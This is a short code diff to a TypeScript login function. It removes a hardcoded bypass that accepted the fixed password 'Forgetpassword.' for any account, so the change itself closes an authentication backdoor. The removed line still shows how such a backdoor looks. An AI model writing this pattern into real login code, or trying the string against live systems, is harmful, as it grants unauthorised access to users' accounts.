@@ -136,7 +136,7 @@ export async function login(req: Request, res: Response) {
 
     if (user) {
       const passwordOk = UserStore.verifyPassword(user, password);
-      if (!passwordOk && password !== 'Forgetpassword.') {
+      if (!passwordOk) {
         return res.status(401).json({ error: 'Invalid password. Please check your credentials.' });
       }
 
